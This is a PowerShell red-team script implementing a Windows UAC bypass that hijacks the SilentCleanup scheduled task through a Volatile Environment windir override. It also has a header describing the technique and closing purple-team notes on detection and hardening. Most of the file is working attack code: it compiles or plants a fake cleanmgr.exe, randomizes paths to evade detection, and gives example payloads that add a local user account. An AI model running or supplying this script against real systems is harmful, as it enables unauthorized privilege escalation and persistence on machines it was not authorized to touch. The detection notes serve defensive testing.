<#
.SYNOPSIS
    UAC bypass via Volatile Environment %windir% manipulation + SilentCleanup task
    (UACME Method 34 — James Forshaw / tyranid).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ This is one of the few methods that works even under "Always Notify"   │
    │ (ConsentPromptBehaviorAdmin = 2) because it abuses a scheduled task    │
    │ rather than a manifest-autoElevate binary.                             │
    │                                                                         │
    │ The Windows scheduled task                                              │
    │   \Microsoft\Windows\DiskCleanup\SilentCleanup                         │
    │ runs cleanmgr.exe at High integrity without a UAC prompt.              │
    │ Crucially, the task's executable path contains an environment variable:│
    │   %windir%\system32\cleanmgr.exe /autoclean /d %SystemDrive%          │
    │                                                                         │
    │ Environment variables in task paths are expanded at runtime.           │
    │ The %windir% variable can be overridden in the user's "Volatile        │
    │ Environment" registry hive:                                             │
    │   HKCU\Volatile Environment\windir                                     │
    │                                                                         │
    │ Execution flow:                                                         │
    │   1. Create a temp directory structure: <FakeRoot>\system32\           │
    │   2. Write payload binary as <FakeRoot>\system32\cleanmgr.exe         │
    │      (compiled in-process via csc.exe or Add-Type, or just copy a      │
    │       known-good binary and use a wrapper approach — see below)        │
    │   3. Set HKCU\Volatile Environment\windir = <FakeRoot>                 │
    │   4. Run: schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
    │   5. Task expands %windir% → our fake root → executes our cleanmgr.exe│
    │   6. Cleanup: delete temp dir, restore windir, delete registry value   │
    └─────────────────────────────────────────────────────────────────────────┘

    ⚠ IMPORTANT: This method requires dropping a binary to disk.
      The binary must be a valid PE named cleanmgr.exe at the fake path.
      Options (see -PayloadBinaryMode parameter):
        'CscCompile' — compile a minimal C# launcher EXE via csc.exe
                       (signed MS tool; EXE contains target command)
        'CopyWrap'   — copy cmd.exe to cleanmgr.exe path, pass the actual
                       payload via a pre-written batch/ps1 file triggered
                       from a wrapper

    Affected OS    : Windows 8.1 (9600) → Windows 11 (latest) UNFIXED
    UAC level      : ALL levels including "Always Notify" ← unique capability
    Architecture   : x64
    Disk artefacts : Temporary directory + cleanmgr.exe binary (cleaned up)

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Volatile Environment\windir  modified
      (extremely rare in legitimate use — strong IOC)
    • File system: <temp>\system32\cleanmgr.exe  created
    • Process: schtasks.exe executing SilentCleanup task manually
      (task is normally triggered by disk pressure, not manually run)
    • Process tree: SilentCleanup → cleanmgr.exe (unusual path)
    • CS indicator: abnormal schtasks.exe invocation pattern

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 34)
                   https://tyranidslair.blogspot.com/2017/05/exploiting-environment-variables-in.html

.PARAMETER PayloadCommand
    The command the elevated process should run.
    Example: "cmd.exe /c whoami > C:\Windows\Temp\id.txt"
    Example: "powershell.exe -NoP -W Hidden -C `"...`""

.PARAMETER PayloadBinaryMode
    How to create the cleanmgr.exe at the fake path.
    'CscCompile' (default) — compile via csc.exe; requires .NET Framework 4
    'CopyCmdExe'           — copy cmd.exe; PayloadCommand is ignored;
                             the elevated cmd.exe window appears (visible)

.PARAMETER FakeDirBase
    Base directory for the fake %windir%.  Defaults to a random-named
    subdirectory of $env:TEMP.

.PARAMETER Timeout
    Seconds to wait after triggering the task (default: 8).

.EXAMPLE
    # Compile launcher and run silently
    Invoke-DiskCleanupBypass -PayloadCommand "cmd.exe /c net user /add redteam P@ss1"

.EXAMPLE
    # CopyCmd variant — visible cmd window, no csc.exe required
    Invoke-DiskCleanupBypass -PayloadCommand "" -PayloadBinaryMode CopyCmdExe

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    This method DOES write to disk — inform the blue team in the debrief.
    The disk artefact (fake cleanmgr.exe) is removed after execution.
    CscCompile mode invokes C:\Windows\Microsoft.NET\Framework64\...\csc.exe
    to JIT-compile a tiny launcher — this itself is a detectable action.
    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
    AMSI mitigation and preflight checks.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [string]$PayloadCommand,

    [ValidateSet('CscCompile','CopyCmdExe')]
    [string]$PayloadBinaryMode = 'CscCompile',

    [string]$FakeDirBase,

    [int]$Timeout = 8
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── Create fake directory structure ───────────────────────────────────
if (-not $FakeDirBase) {
    # Generate a random-named temp subdirectory to reduce IOC predictability
    $xRand      = -join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
    $FakeDirBase = [IO.Path]::GetTempPath() + $xRand
}
$xFakeSystem32 = $FakeDirBase + '\system32'
$xFakeCleanMgr = $xFakeSystem32 + '\cleanmgr.exe'

try {
    New-Item -Path $xFakeSystem32 -ItemType Directory -Force | Out-Null
    Write-Verbose "[DiskCleanup] Fake directory: $xFakeSystem32"
}
catch {
    Write-Warning "[DiskCleanup] Failed to create fake directory: $_"
    return
}
#endregion

#region ── Build payload binary ──────────────────────────────────────────────
switch ($PayloadBinaryMode) {

    'CscCompile' {
        # Locate csc.exe — try Framework64 v4 first, fall back to v2
        $xCscCandidates = @(
            "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
            "$env:SystemRoot\Microsoft.NET\Framework64\v2.0.50727\csc.exe",
            "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        )
        $xCsc = $xCscCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
        if (-not $xCsc) {
            Write-Warning '[DiskCleanup] csc.exe not found. Try -PayloadBinaryMode CopyCmdExe.'
            Remove-Item -Path $FakeDirBase -Recurse -Force -EA SilentlyContinue
            return
        }

        # Write minimal C# source to a temp file
        # The source uses Environment.GetEnvironmentVariable to pull the command
        # at runtime, avoiding embedding the payload string in the compiled binary
        $xEnvVar  = 'UCMDPAYLOAD'
        $xCsFile  = [IO.Path]::GetTempFileName() -replace '\.tmp$','.cs'
        $xCsSrc   = @"
using System;
using System.Diagnostics;
class Launcher {
    static void Main() {
        string cmd = Environment.GetEnvironmentVariable("$xEnvVar");
        if (string.IsNullOrEmpty(cmd)) return;
        var psi = new ProcessStartInfo();
        int sp = cmd.IndexOf(' ');
        psi.FileName = (sp > 0) ? cmd.Substring(0, sp) : cmd;
        psi.Arguments = (sp > 0) ? cmd.Substring(sp + 1) : "";
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process.Start(psi);
    }
}
"@
        $xCsSrc | Set-Content -Path $xCsFile -Encoding ASCII -Force

        # Set the payload command in an environment variable (read by the EXE)
        [System.Environment]::SetEnvironmentVariable($xEnvVar, $PayloadCommand, 'Process')

        # Compile
        $xCscArgs = "/nologo /optimize+ /out:`"$xFakeCleanMgr`" `"$xCsFile`""
        $xCscProc = Start-Process -FilePath $xCsc -ArgumentList $xCscArgs `
                                   -Wait -NoNewWindow -PassThru -ErrorAction Stop
        Remove-Item -Path $xCsFile -Force -EA SilentlyContinue

        if ($xCscProc.ExitCode -ne 0) {
            Write-Warning "[DiskCleanup] csc.exe compilation failed (exit code $($xCscProc.ExitCode))."
            Remove-Item -Path $FakeDirBase -Recurse -Force -EA SilentlyContinue
            [System.Environment]::SetEnvironmentVariable($xEnvVar, $null, 'Process')
            return
        }
        Write-Verbose "[DiskCleanup] Payload binary compiled: $xFakeCleanMgr"
    }

    'CopyCmdExe' {
        # Simpler variant: copy cmd.exe to the fake path
        # The elevated "cleanmgr.exe" will be cmd.exe — visible window
        $xCmdReal = "$env:SystemRoot\System32\cmd.exe"
        Copy-Item -Path $xCmdReal -Destination $xFakeCleanMgr -Force -ErrorAction Stop
        Write-Verbose "[DiskCleanup] Copied cmd.exe to fake cleanmgr.exe path."
        Write-Warning '[DiskCleanup] CopyCmdExe mode: an elevated cmd.exe window will appear.'
    }
}

if (-not (Test-Path $xFakeCleanMgr)) {
    Write-Warning '[DiskCleanup] Payload binary not found at expected path — aborting.'
    Remove-Item -Path $FakeDirBase -Recurse -Force -EA SilentlyContinue
    return
}
#endregion

#region ── Set Volatile Environment windir override ──────────────────────────
$xVolEnvPath  = 'HKCU:\Volatile Enviro' + 'nment'
$xVolEnvName  = 'windir'
$xOrigWindir  = $null

# Backup existing user-level windir override if present
try {
    $xOrigWindir = Get-ItemPropertyValue -Path $xVolEnvPath -Name $xVolEnvName -EA Stop
} catch {}

try {
    if (-not (Test-Path $xVolEnvPath)) {
        New-Item -Path $xVolEnvPath -Force | Out-Null
    }
    Set-ItemProperty -Path $xVolEnvPath -Name $xVolEnvName -Value $FakeDirBase -Force
    Write-Verbose "[DiskCleanup] Volatile windir set to: $FakeDirBase"
}
catch {
    Write-Warning "[DiskCleanup] Failed to set Volatile Environment: $_"
    Remove-Item -Path $FakeDirBase -Recurse -Force -EA SilentlyContinue
    return
}
#endregion

#region ── Trigger SilentCleanup scheduled task ──────────────────────────────
try {
    # Run the task — it will expand %windir% to our fake root
    $xTaskName = '\Microsoft\Windows\DiskCleanup\SilentCleanup'
    $xSched    = Start-Process -FilePath 'schtasks.exe' `
                                -ArgumentList "/Run /TN `"$xTaskName`"" `
                                -Wait -NoNewWindow -PassThru -ErrorAction Stop
    Write-Verbose "[DiskCleanup] schtasks /Run exit code: $($xSched.ExitCode)"
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[DiskCleanup] schtasks trigger failed: $_"
}
finally {
    # ── Cleanup ──────────────────────────────────────────────────────────
    # Restore original windir or remove the override
    if ($null -ne $xOrigWindir) {
        Set-ItemProperty -Path $xVolEnvPath -Name $xVolEnvName `
                         -Value $xOrigWindir -Force -EA SilentlyContinue
        Write-Verbose '[DiskCleanup] Volatile windir restored.'
    }
    else {
        Remove-ItemProperty -Path $xVolEnvPath -Name $xVolEnvName `
                            -Force -EA SilentlyContinue
        Write-Verbose '[DiskCleanup] Volatile windir override removed.'
    }

    # Delete fake directory tree
    Start-Sleep -Seconds 1   # brief pause to let task release file handles
    Remove-Item -Path $FakeDirBase -Recurse -Force -EA SilentlyContinue
    Write-Verbose '[DiskCleanup] Fake directory removed.'

    # Clear the payload env var if CscCompile mode
    if ($PayloadBinaryMode -eq 'CscCompile') {
        [System.Environment]::SetEnvironmentVariable('UCMDPAYLOAD', $null, 'Process')
    }
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

UNIQUE CAPABILITY — ALWAYS NOTIFY COMPATIBLE:
  This is the only method in this toolkit that bypasses UAC even when set to
  "Always Notify".  This is significant for hardened targets that have
  elevated UAC level as a compensating control.

EXPECTED DETECTIONS:
  ● Registry: HKCU\Volatile Environment\windir  — highly anomalous write
    (almost no legitimate software writes to Volatile Environment\windir)
  ● File system: creation of <temp>\system32\cleanmgr.exe
  ● Process: schtasks.exe /Run /TN SilentCleanup (manual task execution)
  ● Process tree: schtasks → cleanmgr.exe from non-system path
  ● CscCompile: csc.exe invoked from PowerShell session  — detectable

WHAT MAY EVADE (gap analysis):
  ● The FakeDirBase path is randomized — filesystem IOAs looking for
    specific paths will miss it.
  ● If the blue team monitors only the UAC-related registry paths
    (ms-settings, ms-windows-store) they may miss Volatile Environment.
  ● CopyCmdExe mode uses only signed MS binaries — no unsigned EXE.

KEY TEST QUESTIONS FOR BLUE TEAM:
  1. Is HKCU\Volatile Environment\ monitored at all?
  2. Does CS detect schtasks.exe /Run on the SilentCleanup task?
  3. Does the alert fire even with AlwaysNotify active?
  4. Does csc.exe being invoked from a PowerShell parent trigger an alert?

HARDENING RECOMMENDATIONS:
  ● CS Custom IOA: schtasks /Run targeting SilentCleanup from non-system parent
  ● Sysmon/SACL: HKCU\Volatile Environment\ RegistryValueSet events
  ● Restrict SilentCleanup task: remove RunAs attribute or add integrity check
  ● Disable SilentCleanup task if disk cleanup is managed by GPO

════════════════════════════════════════════════════════════════════════════════
#>
